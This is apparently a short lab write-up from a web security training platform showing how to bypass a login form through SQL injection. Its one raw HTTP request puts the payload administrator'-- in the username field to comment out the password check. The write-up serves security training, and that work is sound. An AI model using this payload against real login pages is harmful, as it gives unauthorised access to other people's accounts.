---
tags:
  - sqli
---
## SQL injection vulnerability allowing login bypass

1. Send the credentials `administrator:password` and notice that it fails
2. Send the following request and bypass the authentication mechanism

```
POST /login HTTP/2
Host: 0a610047042d1026803bee9900bd0078.web-security-academy.net
Cookie: session=VKoDv0fEUU2tgdJAJhJauLtVwpmd4rZQ
Content-Length: 83
Cache-Control: max-age=0
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Origin: https://0a610047042d1026803bee9900bd0078.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a610047042d1026803bee9900bd0078.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=foQ9RRJfFo7Z9DIialQ8ejlbNq0cBjwv&username=administrator%27--&password=password
```